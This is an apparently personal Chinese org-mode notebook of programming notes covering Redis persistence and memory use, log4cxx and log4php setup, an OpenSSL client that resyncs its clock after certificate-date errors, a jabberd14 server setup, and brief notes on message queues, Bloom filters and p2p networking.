* DONE 解决保存快照失败后redis无法写入的问题                          :redis:
  CLOSED: <2012-12-16 日 15:14>
  
  用命令行工具连上后执行“set test 0”出现以下错误提示：
  #+BEGIN_EXAMPLE
  MISCONF Redis is configured to save RDB snapshots, but is currently not able to persist on disk. Commands that may modify the data set are disabled. Please check Redis logs for details about the error.
  #+END_EXAMPLE
  这个应该是之前强制停止redis快照导致的，查看redis快照状态证实了这一点：
  #+BEGIN_EXAMPLE
  redis 127.0.0.1:6379> info
  ...
  rdb_last_bgsave_status:err
  ...
  #+END_EXAMPLE
  通过关闭配置项stop-writes-on-bgsave-error解决该问题。
  #+BEGIN_EXAMPLE
  redis 127.0.0.1:6379> config set stop-writes-on-bgsave-error no
  #+END_EXAMPLE

* DONE 使用hash表结构减少redis内存占用                                :redis:
  CLOSED: <2012-12-16 日 15:14>

  当hash结构中的元素较少（少于redis.conf:hash-max-zipmap-entries指定的数量时，配置成<=1000，过大会减低处理速度，参见： [[http://stackoverflow.com/questions/11281734/redis-using-hashes][这里]] 和 [[http://instagram-engineering.tumblr.com/post/12202313862/storing-hundreds-of-millions-of-simple-key-value-pairs][这里]] ）且数据为整型时，redis使用特殊的方式（数组保存，时间换空间）保存hash结构以减少内存占用，参见 [[http://redis.io/topics/memory-optimization][这里]] 和 [[http://stackoverflow.com/questions/9625246/what-are-the-underlying-data-structures-used-for-redis][这里]] 。但当hash结构超过指定数量时将使用普通的[[http://redis.io/commands#string][字符串]]方式保存，也就无法再节省内存了。

* DONE 估算redis内存占用                                              :redis:
  CLOSED: <2012-12-16 日 15:14>

  参考: [[http://lethain.com/notes-on-redis-memory-usage/][Notes on Redis Memory Usage]]

  - 测试环境
    - redis版本 :: redis_version:2.4.4
    - 操作系统（uname -a） :: Linux CentOS 2.6.32-220.13.1.el6.x86_64 #1 SMP Tue Apr 17 23:56:34 BST 2012 x86_64 x86_64 x86_64 GNU/Linux
    - python版本（python --version） :: Python 2.6.6

** Strings
   - 测试脚本
     #+BEGIN_SRC python
       #!/bin/env python
       
       import redis
       import uuid
       import time
       
       r = redis.Redis(host='localhost', port=6379, db=0)
       for num_strings in (100000,):
           r.flushall()
           time.sleep(1.0)
           initial_size = r.dbsize()
           initial_info = r.info()
       
           for i in xrange(0, num_strings):
               r.set(str(uuid.uuid4()), time.time())
               #r.setex(str(uuid.uuid4()), time.time(), 100000)
           final_size = r.dbsize()
           final_info = r.info()
       
           print "For %s strings." % (num_strings,)
           print "Keys: %s => %s" % (initial_size, final_size)
           print "Memory: %s => %s" % (initial_info['used_memory'],
                                           final_info['used_memory'])
           print "Memory per key: %d"%((int(final_info['used_memory']) - int(initial_info['used_memory'])) / num_strings)
       #+END_SRC
   - 测试结果
     - set :: 每个key-value占用138字节，可见redis本身的维护开销为89字节
     - setex :: 每个key-value占用180字节，可见redis本身的维护开销为131字节，启用过期时间需要42字节开销（这是因为redis使用新的链表保存设置了过期时间的条目）。

** Sets
   - 测试脚本
     #+BEGIN_SRC python
       #!/bin/env python
       
       import redis
       import math
       import time
       
       r = redis.Redis(host='localhost', port=6379, db=0)
       set_capcity = int(r.config_get("set-max-intset-entries")["set-max-intset-entries"])
       
       def set_name(i, num_strings, set_capcity):
           set_num = math.ceil(num_strings/float(set_capcity))
           return "s%d"%(i%set_num)
           
       for num_strings in (100000,):
           r.flushall()
           time.sleep(1.0)
           initial_size = r.dbsize()
           initial_info = r.info()
       
           for i in xrange(0, num_strings):
               #r.sadd("s", str(i))
               r.sadd(set_name(i, num_strings, set_capcity), str(i))
           final_size = r.dbsize()
           final_info = r.info()
       
           print "For %s strings." % (num_strings,)
           print "Keys: %s => %s" % (initial_size, final_size)
           print "Memory: %s => %s" % (initial_info['used_memory'],
                                           final_info['used_memory'])
           print "Memory per key: %d"%((int(final_info['used_memory']) - int(initial_info['used_memory'])) / num_strings)
       
       #+END_SRC

   - 测试结果
     - 启用压缩 :: 每个value占用4字节
     - 不启用压缩 :: 每个value占用39字节
     注意: redis的set仅当值为整型，压缩才会生效。

** 内存预留
   除非你能够保证你的机器总是有一半的空闲内存，否则别使用快照方式持久化数据或者通过执行BGREWRITEAOF压缩aof文件。
   redis在执行bgsave时，会进行一次fork，fork后的进程负责将内存中的数据写入磁盘，由于fork采用Copy-On-Write，两个redis进程共享内存中的数据。redis如果有数据更新，则会将对应的共享内存页创建一份副本再更新，当更新操作足够频繁时，共享的内存空间会迅速地副本化，导致物理内存被耗光，系统被迫动用交换空间，从而导致redis服务极不稳定，整个系统堵塞在磁盘io上。

* DONE linux下跨进程传递文件描述符                                    :linux:
  CLOSED: <2013-03-09 六 15:11>

** 问题
   在web开发中，以典型的php-fpm为例，对于到外部系统的连接（如：mysql、redis）等都提供了持久连接接口（pconnect），但是受限于多进程模型，事实上是每个php-fpm进程都有单独的一个连接池的（参见：《[[http:5f53-php-90474e0a-redis.html][当php遇上redis]]》），大量空闲连接的存在不仅对系统资源造成了浪费（不单指fd空间，像mysql的每连接一线程会附带大量内存空间：sort_buffer、read_buffer等），而且整个系统将无法横向扩展（如：mysql连接数限制）。如果可以在进程间共享文件描述符，将可以大大提升系统性能，促进多进程模型的应用。

** 方案
   在linux平台下，sendmsg、recvmsg可以将一个进程的文件描述符传递给另一进程使用，这使得实现系统级的连接池成为可能。

** 实现
   《The Linux Programming Interface》61.13.3 Passing File Descriptors
    
* DONE Web模型初探                                                      :web:
  CLOSED: <2013-02-28 四 15:07>

** CGI

   全称为Common Gateway Interface，即公共网关接口。
   当Web服务器收到一个请求时，运行相应的处理程序，相关参数通过标准输入传递给处理程序，处理程序的标准输出做为响应内容，处理程序运行结束后将响应发送给客户端。
   
   - 性能 *

     进程级，每请求一进程。进程创建有很大的开销，并发数与系统资源消耗呈线性增长，有限的系统资源成为瓶颈。
     
** FastCGI

   为CGI的改良，CGI程序做为独立的网络后台程序运行，当Web服务器收到一个请求时，发起一个tcp请求到处理程序，通过该tcp连接传入相关参数，处理程序的响应也通过该tcp连接发回给Web服务器，处理程序关闭该连接表示处理完毕，Web服务器最终将响应发送给客户端。

   - 性能 **

     网络级，每请求一连接。CGI的改良，重用进程，进程处理完一个请求后再处理下一请求，对于多个请求，只需要付出一次进程创建的开销，可以在后继请求重用资源（从文件载入的配置项、查询到的数据、打开的文件、数据库连接等）。因为处理程序是串行处理请求，往往需要同时运行多个处理程序以提升并发处理能力，这些处理程序无法共享资源以进一步提升性能。
   
   - 附录

     Web服务器可重用到服务程序的连接进一步提升性能（如：nginx的[[http://nginx.org/en/docs/http/ngx_http_upstream_module.html#keepalive][upstream_keepalive]]）。
     
** WSGI

** uWSGI

* DONE memcached_get会重置过期时间吗？                            :memcached:
  CLOSED: <2012-11-13 二 20:29>

  不会。获取数据的操作不会影响数据的过期时间，最新的memcache1.6添加了touch和GAT（get and touch)命令，可以在获取数据时过期时间。
* DONE python中MySQLdb使用utf-8字符集                          :python:mysql:
  CLOSED: <2011-04-29 Fri 01:22>

  - 要避免乱码需要做好以下几点 ::
    - python源代码保存为utf-8
    - 数据库建成utf-8
    - mysql连接设置为utf-8
    - 查询結果中的文本字段是unicode的，转回utf-8

  - 总结性的示例代码 ::
    #+begin_src python
      #!/usr/bin/env python
      #-*- coding: utf-8 -*-
      
      import MySQLdb
      
      if __name__ == '__main__':
          mysql = MySQLdb.connect(host='localhost', user='root', passwd='123456', charset='utf8')
          cursor = mysql.cursor()
          cursor.execute('SET NAMES UTF8')
          sql = 'DROP DATABASE IF EXISTS mysqldb_utf8_test'
          cursor.execute(sql)
          sql = 'CREATE DATABASE mysqldb_utf8_test DEFAULT CHARACTER SET utf8 COLLATE utf8_general_ci'
          cursor.execute(sql)
          mysql = MySQLdb.connect(host='localhost', user='root', passwd='123456', db='mysqldb_utf8_test', charset='utf8')
          cursor = mysql.cursor()
          cursor.execute('SET NAMES UTF8')
          sql = 'CREATE TABLE utf8_table(key_field VARCHAR(32) NOT NULL, value_field VARCHAR(255) NOT NULL)'
          cursor.execute(sql)
          key = 'tangxinfa'
          value = '好人一个'
          sql = 'INSERT INTO utf8_table VALUES("%s", "%s")'%(key, value)
          cursor.execute(sql)       #注意某些旧版本的mysql（如4.1.22以下），mysql.character_set_name()总是返回latin1，会引起乱码，需要改为cursor.execute('INSERT INTO utf8_table VALUES("%s", "%s")', (key, value))
          sql = 'select * from utf8_table'
          cursor.execute(sql)
          for record in cursor.fetchall():
              for item in record:
                  print item.encode('utf8')
    #+end_src

  - 参考 ::
    - http://mysql-python.sourceforge.net/MySQLdb.html
    - http://bbs.phpchina.com/viewthread.php?tid=13861
    - http://hi.baidu.com/ak456/blog/item/c318502394aa20569922ed7b.html

* DONE log4cxx使用心得                                              :log4cxx:
  CLOSED: <2008-06-17 Tue 10:01>

  - 简介

    apache出品必属精品。正宗c++日志库，与log4j一脉相承。

    http://logging.apache.org/log4cxx/index.html

  - 下载、编译、安装

    打算安装到${HOME}/libs目录下：

    #+begin_src sh
    cd ~/libs
    wget http://mirror.bjtu.edu.cn/apache//apr/apr-1.4.4.tar.bz2
    tar xjvf apr-1.4.4.tar.bz2
    cd apr-1.4.4
    ./configure --prefix=${HOME}/libs && make && make install
    cd ..
    wget http://mirror.bjtu.edu.cn/apache//apr/apr-util-1.3.11.tar.bz2
    tar xjvf apr-util-1.3.11.tar.bz2
    cd apr-util-1.3.11
    ./configure --prefix=${HOME}/libs --with-apr=${HOME}/libs && make && make install
    cd ..
    wget http://apache.etoak.com//logging/log4cxx/0.10.0/apache-log4cxx-0.10.0.tar.gz
    tar xzvf apache-log4cxx-0.10.0.tar.gz
    cd apache-log4cxx-0.10.0
    ./configure --with-charset=utf-8 --prefix=${HOME}/libs --with-apr=${HOME}/libs --with-apr-util=${HOME}/libs && make && make install
    #+end_src

  - 使用例子

    =hello.cpp= ：
    #+begin_src cpp
      #include "log4cxx/logger.h"
      #include "log4cxx/propertyconfigurator.h"
      
      static log4cxx::LoggerPtr logger(log4cxx::Logger::getLogger("hello"));
      
      int main(int argc, char *argv[])
      {
        log4cxx::PropertyConfigurator::configure("./log4cxx_hello.properties");
        LOG4CXX_INFO(logger, "你好，log4cxx!");
        return 0;
      }
    #+end_src
  
    =log4cxx_hello.properties= ：
    #+begin_example
      log4j.rootLogger=debug, R
      
      log4j.appender.stdout=org.apache.log4j.ConsoleAppender
      log4j.appender.stdout.layout=org.apache.log4j.PatternLayout
      
      # Pattern to output the caller's file name and line number.
      log4j.appender.stdout.layout.ConversionPattern=%5p [%t] (%F:%L) - %m%n
      
      log4j.appender.R=org.apache.log4j.RollingFileAppender
      log4j.appender.R.File=./hello.log
      
      log4j.appender.R.MaxFileSize=100KB
      # Keep one backup file
      log4j.appender.R.MaxBackupIndex=10
      
      log4j.appender.R.layout=org.apache.log4j.PatternLayout
      log4j.appender.R.layout.ConversionPattern=%5p %c [%t] (%F:%L) - %m%n
    #+end_example

    编译：
    #+begin_src sh
      g++ -o hello hello.cpp -I${HOME}/libs/include ${HOME}/libs/lib/liblog4cxx.a ${HOME}/libs/lib/libaprutil-1.a ${HOME}/libs/lib/libapr-1.a  -lexpat -lpthread
    #+end_src

  - 注意事项

    由于一个日志文件写满后会重命名所有已有的日志文件，配置过大MaxBackupIndex的会有性能问题，因此log4cxx编译时限制了它的大小（大概十多个）以避免配置的MaxBackupIndex过大，如果要设置更大一点的MaxFileSize来保存更多日志，需要在编译前进行修改。

    参考：http://objectmix.com/apache/684503-urgent-log4cxx-large-window-sizes-not-allowed.html

  - 使用技巧
    - 决定配置文件的格式（xml，property）。以使用相应的配置器（Configurator）装入配置文件。

      xml虽较property格式繁锁，支持的配置面更全，而property格式的配置文件使用更简单，容易在网上找到现成的配置文件。

    - logger命名

      logger名称反映了软件模块，如果有代表软件模块的类，则在类中包含以该类类名命名的logger对象，该模块功能相关代码通过该logger进行日志记录。
      另外可将logger对象作为全局变量，方便使用，特别是当软件模块较松散，并无对应的封装类时。

    - 在代码中适当地放置日志代码。引用适当的日志对象，对日志进行适当分级。

    - 余下的工作就是修改配置文件，对日志进行控制了。

  　　使用配置文件的好处就是可以方便地配置日志而不需要修改源代码，可以在配置文件中方便配置日志过滤、格式、日志目的地。

  - 体验

  　之前产品中用到的是log4cplus，但是常常有写日志崩溃的情况出现，使用log4cxx正是用于解决该崩溃。
* DONE SSL双方系统时间不一致导致的SSL连接失败及其解决方案         :openssl:c:
  CLOSED: <2008-07-25 五 17:45>

  在产品使用中，实施人员常常报告服务器与客户端无法连接，最终查明原因是双方的时间设置不一致。OpenSSL证书有一个有效时间段，当客户端或服务器的系统时间不在这个时间段内时SSL会因证书验证失败而无法连接。在实施中系统时间错误是很常见的，因不能上网而未开时间自动同步、bios没电了、客户疏忽等原因都会导致系统时间设置错误。如果连接失败后再查看系统时间设置进行故障排查终归是一件麻烦的事情。

  解决这个问题有以下几个办法：

  - 将证书的有效期设置得够大（如：1970-2099）
    
    这样估计可以在一定程度上解决这个问题，不过这也是个馊主意，一般申请的证书总会有一个合理的有效期。

  - 检测及必要时自动同步客户端与服务器的时间
    
    通过用wireshake抓包分析SSL建立连接的过程，发现在SSL握手过程中，会向对方传送本机的系统时间。因此一个显而易见的办法就是，当连接过程中检测到证书过期，将客户端的时间同步为服务器端的时间，再重连即可。

    下面是具体的示例代码：
    #+begin_src c
      #include <openssl/ssl.h>
      #include <openssl/bio.h>
      #include <openssl/err.h>
      #include <winsock2.h>
      #include <stdio.h>
      #include <string.h>
      #include <time.h>
      
      typedef struct _TimeInfo
      {
          time_t client;  /*客户端的时间*/
          time_t server;  /*服务器的时间*/
      } TimeInfo;
      
      /**
       * 同步系统时间.
       */
      BOOL syncSystemTime(time_t t)
      {
          SYSTEMTIME st;
          FILETIME   ft;  
          LONGLONG   ll;  
          
          ll = Int32x32To64(t, 10000000) + 116444736000000000; //1970.01.01  
          
          ft.dwLowDateTime  = (DWORD)ll;  
          ft.dwHighDateTime = (DWORD)(ll >> 32);  
          
          return FileTimeToSystemTime(&ft, &st) && SetSystemTime(&st);
      }
      
      /**
       * 获取SSL握手过程中服务器与客户端双方的系统时间.
       */
      void getSSLHandleShakeTimeInfo(int write_p,
                                     int version,
                                     int content_type,
                                     const unsigned char* buf,
                                     size_t len,
                                     SSL *ssl,
                                     TimeInfo *ti)
      {
          if(content_type != 22)   //require handshake message
              return;
          if(len < 42)
              return;
          if(buf[0] == 1)          //ClientHello Message send from client to server
              ti->client = htonl(*((u_long*)(buf + 6)));
          else if(buf[0] == 2)     //ServerHello Message send from server to client
              ti->server = htonl(*((u_long*)(buf + 6)));
          else
              return;
      }
      
      int main()
      {
          BIO * bio;
          SSL * ssl;
          SSL_CTX * ctx;
          TimeInfo timeInfo = {-1, -1};
          BOOL timeSynced = FALSE;
          long result;
      
          /* Set up the library */
          SSL_library_init();
          ERR_load_BIO_strings();
          SSL_load_error_strings();
      
          /* Set up the SSL context */
          ctx = SSL_CTX_new(SSLv3_client_method());
          if(ctx == NULL)
          {
              fprintf(stderr, "Error new SSL_CTX\n");
              ERR_print_errors_fp(stderr);
              SSL_CTX_free(ctx);
              return 0;
          }
      
          /* Get Server and Client system time via SSL Handshake */
          SSL_CTX_set_msg_callback(ctx, getSSLHandleShakeTimeInfo);
          SSL_CTX_set_msg_callback_arg(ctx, &timeInfo);
          
          /* Load the trust store */
          if(! SSL_CTX_load_verify_locations(ctx, ".\\certs\\cacert.pem", NULL))
          {
              fprintf(stderr, "Error loading trust store\n");
              ERR_print_errors_fp(stderr);
              SSL_CTX_free(ctx);
              return 0;
          }
      
          /* Setup the connection */
          bio = BIO_new_ssl_connect(ctx);
      
          /* Set the SSL_MODE_AUTO_RETRY flag */
          BIO_get_ssl(bio, & ssl);
          SSL_set_mode(ssl, SSL_MODE_AUTO_RETRY);
      
          /* Create and setup the connection */
          BIO_set_conn_hostname(bio, "192.168.1.5:5555");
          if(BIO_do_connect(bio) <= 0)
          {
              fprintf(stderr, "Error attempting to connect\n");
              ERR_print_errors_fp(stderr);
              BIO_free_all(bio);
              SSL_CTX_free(ctx);
              return 0;
          }
          
          /* Check the certificate */
          switch(SSL_get_verify_result(ssl))
          {
          case X509_V_OK:
              break;
          case X509_V_ERR_CERT_NOT_YET_VALID:
          case X509_V_ERR_CERT_HAS_EXPIRED:
              if(timeInfo.server != -1 && timeInfo.client != -1)
              {
                  printf("当前客户端时间: %s", ctime(&timeInfo.client));
                  printf("当前服务器时间: %s", ctime(&timeInfo.server));
                  printf("尝试与服务器时间同步");
                  
                  if(syncSystemTime(timeInfo.server))
                      printf("成功\n");
                  else
                      printf("失败\n");
                  printf("请重试连接服务器！\n");
              }
          default:
              fprintf(stderr, "Certificate verification error: %i\n", SSL_get_verify_result(ssl));
              BIO_free_all(bio);
              SSL_CTX_free(ctx);
              return 0;
          }
      
          /* Close the connection and free the context */
          BIO_free_all(bio);
          SSL_CTX_free(ctx);
          return 0;
      }
    #+end_src
* DONE 搭建jabber服务器                                        :jabber:linux:
  CLOSED: <2011-05-04 三 00:32>

  - 编译安装
    
    =下载=
    #+begin_src sh
      wget http://download.jabberd.org/jabberd14/jabberd14-1.6.1.1.tar.gz
      tar xzvf jabberd14-1.6.1.1.tar.gz
      cd jabberd14-1.6.1.1
    #+end_src

    =修改代码以解决编译错误=
    #+begin_src sh
      diff -r jabberd14-1.6.1.1/jabberd/lib/xmlnode.cc tmp/jabberd14-1.6.1.1/jabberd/lib/xmlnode.cc
      882,884c882,884
      <     const char *next_step = NULL;
      <     const char *start_predicate = NULL;
      <     const char *end_predicate = NULL;
      ---
      >     char *next_step = NULL;
      >     char *start_predicate = NULL;
      >     char *end_predicate = NULL;
      1836c1836
      <         ((char*)strchr(lang, '-'))[0] = 0;
      ---
      >         strchr(lang, '-')[0] = 0;
      diff -r jabberd14-1.6.1.1/jabberd/log.cc tmp/jabberd14-1.6.1.1/jabberd/log.cc
      89c89
      <         pos = (char*)strchr(zone,'.');
      ---
      >     pos = strchr(zone,'.');
      diff -r jabberd14-1.6.1.1/jabberd/mio_tls.cc tmp/jabberd14-1.6.1.1/jabberd/mio_tls.cc
      615c615
      <         ret = gnutls_certificate_set_openpgp_key_file(current_credentials, pubfile, privfile, GNUTLS_OPENPGP_FMT_BASE64);
      ---
      >         ret = gnutls_certificate_set_openpgp_key_file(current_credentials, pubfile, privfile);
      634c634
      <         ret = gnutls_certificate_set_openpgp_keyring_file(current_credentials, file, GNUTLS_OPENPGP_FMT_BASE64);
      ---
      >         ret = gnutls_certificate_set_openpgp_keyring_file(current_credentials, file);
      640a641,657
      >     }
      >
      >     // load GnuPG trustdb
      >     if (j_strcmp(xmlnode_get_localname(cur), "trustdb") == 0) {
      >         char const *const file = xmlnode_get_data(cur);
      >
      >         if (file == NULL) {
      >         log_warn(NULL, "Initializing TLS subsystem: <trustdb/> element inside the TLS configuration, that does not contain a file-name.");
      >         continue;
      >         }
      >
      >         // load the GnuPG trustdb
      >         ret = gnutls_certificate_set_openpgp_trustdb(current_credentials, file);
      >         if (ret < 0) {
      >         log_error(NULL, "Error loading GnuPG trustdb %s: %s", file, gnutls_strerror(ret));
      >         continue;
      >         }
    #+end_src
    
    =编译安装=
    #+begin_src sh
      ./configure && make && sudo make install
    #+end_src

    如出错通常是少了相关依赖库，用包管理工具（如：ubuntu下的新立得）安装即可。

  - 配置

    按照mysql.sql中的注释配置数据库：
    
    #+begin_src sh
      mysql -uroot -p
      mysql> CREATE DATABASE jabber CHARACTER SET utf8;
      mysql> use jabber;
      mysql> grant all on jabber.* to jabber@localhost identified by 'secret';
      mysql> \. mysql.sql
    #+end_src

  - 运行

    #+begin_src sh
      sudo jabberd -h localhost -B
    #+end_src

  - 注册用户1

    #+begin_src sh
      telnet localhost 5222
      <stream:stream
        to='localhost'
        xmlns='jabber:client'
        xmlns:stream='http://etherx.jabber.org/streams'>
      
      <iq id='reg1' type='set'>
        <query xmlns='jabber:iq:register'>
          <username>jack</username>
          <password>jack</password>
          <name>jack</name>
          <email></email>
        </query>
      </iq>
      
      </stream:stream>
    #+end_src
  
  - 登录用户1

    #+begin_example
      Empathy菜单->编辑->帐户->添加：
      协议: Jabber
      登录ID: jack@localhost
      记住密码
      密码: jack
      登录
    #+end_example

  - 注册用户2
    
    #+begin_src sh
      telnet localhost 5222
      <stream:stream
        to='localhost'
        xmlns='jabber:client'
        xmlns:stream='http://etherx.jabber.org/streams'>
      
      <iq id='reg1' type='set'>
        <query xmlns='jabber:iq:register'>
          <username>rose</username>
          <password>rose</password>
          <name>rose</name>
          <email></email>
        </query>
      </iq>
      
      </stream:stream>
    #+end_src

  - 用户1加用户2为联系人
    
    #+begin_example
      Empathy菜单->聊天->添加联系人:
      帐户：jack@localhost
      标识符: rose@localhost
      添加
    #+end_example

  - 登录用户2，并发一个消息给用户1

    #+begin_src sh
      telnet localhost 5222
      <stream:stream
        to='localhost'
        xmlns='jabber:client'
        xmlns:stream='http://etherx.jabber.org/streams'>
      
      <iq id='auth1' type='set'>
        <query xmlns='jabber:iq:auth'>
          <username>rose</username>
          <password>rose</password>
          <resource>test</resource>
        </query>
      </iq>
      
      <presence/>
      
      <message to='jack@localhost'>
        <body>hello, jack</body>
      </message>
      
      </stream:stream>
    #+end_src
* TODO Node.js学习                                                     :node:
  
** 适用范围
   
   - 引用[[http://nodejs.org/docs/latest/][原文]] ::

     #+begin_example
       Node.js is a platform built on Chrome's JavaScript runtime for easily building fast, scalable network applications. Node.js uses an event-driven, non-blocking I/O model that makes it lightweight and efficient, perfect for data-intensive real-time applications that run across distributed devices.
     #+end_example
   
   - 可以归结如下 ::

     - 较低的资源消耗处理海量网络请求
     - 开发分布式的数据密集型实时应用

** 参考资源
   
   - [[http://www.nodebeginner.org/index-zh-cn.html][Node入门]] ::

     从Hello World到图片上传示例演示了如何以正确的方式开发[[http://nodejs.org][Node.js]]应用。
   
   - [[http://nodejs.org/docs/latest/api/all.html][Node.js官方API手册]]

* DONE log4php初步使用                                              :log4php:
  CLOSED: [2013-05-06 一 18:32]
  
** 简介
   apache出品必属精品。正宗php日志库，与log4j一脉相承。

   [[http://logging.apache.org/log4php/]]

** 安装
   参考：[[http://logging.apache.org/log4php/install.html]]

   - 有root权限，安装到系统目录

     #+begin_src sh
       sudo apt-get install php-pear
       sudo pear channel-discover pear.apache.org/log4php
       sudo pear install log4php/Apache_log4php
     #+end_src

   - 没有root权限，安装到当前目录下
      
     #+begin_src sh
       cd libs
       wget http://mirrors.tuna.tsinghua.edu.cn/apache/logging/log4php/2.3.0/apache-log4php-2.3.0-src.tar.gz
       tar xzvf apache-log4php-2.3.0-src.tar.gz
       ln -sf apache-log4php-2.3.0/src/main/php ./log4php
     #+end_src

** 使用
    
    - 进行一下封装定制，可以满足绝大部分情况下的使用

      - 类似nginx的访问日志记录格式
      - 日志中输出文件名及行号
      - 日志文件数据限制为10个，每个日志文件大小为10MB

      [[file:../static/logging.inc][logging.inc]]

    - 使用示例

      =example.php=
      #+begin_src php
        <?php
        define('LOGGING_APPNAME', 'example');
        require_once(dirname(__FILE__) . "/logging.inc");
        
        $logger = Logger::getLogger("main");
        $logger->debug("info log");
        $logger->warn("info log");
        $logger->error("info log");
        ?>
      #+end_src

    - 运行结果

      #+begin_src sh
        $ php ./example.php
        $ tail -f ./logs/example.log
        2013-05-06 18:24:57,925 [DEBUG] main: info log (/home/tangxinfa/php/example.php:6)
        2013-05-06 18:24:57,930 [WARN] main: info log (/home/tangxinfa/php/example.php:7)
        2013-05-06 18:24:57,930 [ERROR] main: info log (/home/tangxinfa/php/example.php:8)
      #+end_src

* TODO 使用boost.coroutine异步访问mysql                           :cpp:mysql:
  
  开发高性能、高并发后台服务时，访问mysql总是一件头疼的事情，这绝对算是整个系统中最伤性能的部分，访问mysql总是很慢的，并且连接数受限，阻碍了开发高性能可线性扩展的后台服务。这也导致了像memcache、redis之类的NoSQL数据库的流行。

  但是，到目前为止mysql在可靠存储数据方面仍无法替代，NoSQL一般也仅用于做为mysql的缓存层，以减轻mysql的压力，所以探究一下如何更高效地访问mysql还是很有必要的。
  
  提高访问mysql效率的常见方法是异步化：用独立的数据库访问线程来执行数据库操作，在执行完成后通知应用逻辑进行后继处理，这种程序往往主程序是一个事件循环，而应用逻辑被切分成一个个回调函数，导致程序流程变得更加复杂，不易理解也容易滋生问题。

  接下来我打算使用协程来异步访问mysql，协程（[[http://www.boost.org/doc/libs/release/libs/coroutine/][boost.coroutine]]）可以让我们线性的书写处理逻辑，而不必引入复杂的状态机。

* TODO 深入理解Ember.js                                           :ember.js:
  
** Ember.js的组件层次

   从下往上依次为：
   - 模板（templates）
     使用Handlebars模板语言描述用户界面，除了纯html还包含以下组件：
     - 表达式。{{firstName}}，以html来展示控制器和模型的信息，并保持同步。
     - 插座。{{outlet}}，路由根据应用当前所处的位置将对应的模板插入到相应的插座中。
     - 视图。{{view}}，将原始的用户事件（如：点击）转化为语义事件（如：增、删、改)并发送到控制器。
   - 控制器（controller）
     保存应用状态的对象。通常用于将模型进行进一步包装后暴露给模板。
   - 模型（model）
     保存持久状态的对象。通常从服务器端装入并最终会保存回去。
   - 路由（router）
     管理应用状态的对象。根据当前的url显示相应的模板，以及为模板指定配对的模型。
* DONE 《理解Http与Spdy协议》培训课件                             :http:spdy:
  CLOSED: [2013-05-23 四 13:11]
  
  本课件针对刚入职的毕业生，讲解Http与Spdy协议的基础知识。

** 开发计划 [1/5]
   - [X] 编写Http部分大纲
   - [ ] 编写Http部分章节内容
   - [ ] 编写Spdy部分大纲
   - [ ] 编写Spdy部分章节内容
   - [ ] 制作Microsoft PowerPoint格式文档
  
** 在线演示
   [[http://blog.kankanan.com/slides/理解Http与Spdy协议.html][《理解Http与Spdy协议》]]

* TODO 开源MQ（Message Queue）调研                                       :MQ:
  
** ZeroMQ
   
   - 语言 :: c++
   - 协议 :: ZMQP
   - 定位 :: 类似于POSIX message queue，在socket之上搭建的IPC（机制），它不是消息中间件，由于其库的本质，速度上比MQ中间件快了一个数量级。
   - 总结 :: 和其它的MQ中间件没有可比性，在不需要持久化、稳定性、追求极致性能、易部署的情况下可以考虑使用，或根据情况同时使用其它的MQ服务。

** RabbitMQ

   - 语言 :: Erlang
   - 协议 :: AMQP
   - 定位 :: 消息中间件
   - 总结 :: 应该是性能最好的开源消息中间件，在需要保证消息不丢失的情况下，可以考虑采用。像mysql一样需要启动服务，有各种语言的客户端库（一般使用不会去定制服务端的代码，大可不必介意自已是否熟悉Erlang语言）。

* TODO Hash、Bitmap和BloomFilter算法     :hash:algorithms:bitmap:bloomfilter:

  Hash、Bitmap和BloomFilter都可用于判断某个元素是否在集合中。

  参考：[[http://blog.csdn.net/jiaomeng/article/details/1496329][从哈希存储到Bloom Filter]]

** Hash
   
   - 原理
     准备好哈希空间（足够保存集合中的所有元素），对于每个元素通过哈希函数求出其在哈希空间保存的位置，由于两个不同元素可能被哈希函数映射到同一哈希空间位置（碰撞、冲突），
     这需要进行一次解冲突，通常使用冲突链解决：获取哈希空间映射位置已存在的元素，如果元素值与当前元素不等，则挂在该哈希空间的冲突链中，图示如下：

     #+begin_src artist
       
       hash space 
       +-------------------------------------------------------------------+
       |     key1   key2   key3   key4   key5   key6                     --+--> hash keys
       |   +------+------+------+------+------+------+-----------------+   |        
       |   | val1 | val2 | val3 | val4 | val5 | val6 |  ...            | --+--> element values
       |   |   |  | NULL | NULL | NULL | NULL | NULL |                 | --+--> collision link head 
       |   +---+--+------+------+------+------+------+-----------------+   |                       
       |       |                                                           |                    
       |   +---+--+                                                        |                    
       |   |val1.1| -------------------------------------------------------+--> collision element values
       |   | NULL | -------------------------------------------------------+--> collision link pointer
       |   +------+                                                        |
       +-------------------------------------------------------------------+
       
     #+end_src
     
   - 特点

     - 0误差 :: 判断结果100%可信
     - 空间浪费 :: 由于哈希函数不可能做到没有冲突，所以哈希空间必然大于元素集合空间
     - 需要有好的哈希函数 :: 当哈希不均匀时，会导致一些哈希位置冲突链过长，访问这个哈希位置时算法复杂度由哈希表（O(1)）退化成链表（O(n)）。

** Bitmap
   
   - 原理
     准备好位图空间（足够保存集合中的所有元素的位数），对于每个元素通过哈希函数求出其在位图空间占用的位，位置为1表示元素存在，由于位图空间没有保存元素值，因此无法检测哈希冲突。

   - 特点
     
     - 有误差 :: 仅能给出元素一定不在集合内以及元素可能在集合内的判断。当哈希函数能做到完全均匀才能达到0误差。
     - 节省空间 :: 每个元素只需要一个位来存储。

** BloomFilter
   
   - 参考 :: [[http://zh.wikipedia.org/wiki/%E5%B8%83%E9%9A%86%E8%BF%87%E6%BB%A4%E5%99%A8][布隆过滤器 - 维基百科]]、[[http://en.wikipedia.org/wiki/Bloom_filter][Bloom filter - Wikipedia]]
   
   
   - 原理
     类似于位图，只不过每个元素由n个哈希函数来映射到n个位，元素映射的所有位都为1方表示元素存在。
     
   - 特点

     - 有误差 :: 比起Bitmap误差率可以很好的控制（除了通过选择更好的哈希函数，还可以通过增加更多的哈希函数以及相应的哈希空间来减少误差率）
     - 节省空间 :: 每个元素只需要n个位来存储，n可自定。

* TODO p2p系统构建                                                      :p2p:

** 结点间的连通
   
   - 双方外网 :: 直连
   
   - 一内一外 :: 直连／反连
     - 中间服务器 :: 发送被反连方指令给反连方，所有内网服务器都需要在中间服务器上保持一个连接，以接收控制指令。

   - 双方内网 :: 穿透
     
     - 使用UDP进行NAT穿透
       
       - 穿透服务器 :: 为穿透双方服务的外网服务器

** 结点网
   
   - 结点标识符 :: 硬件标识（mac地址）或用户id
   - 所有结点启动时加入到网络中，并发送心跳，结点主动关闭或通过心跳检测出已下线时退出网络。
   - 需要记录结点以下信息
     - 类型 :: 外网、可穿透内网、封闭内网
     - 负载 :: 上传能力

   这就是状态服务器，状态服务器需在结点状态变化时同步结点状态信息到资源服务器

** 资源网

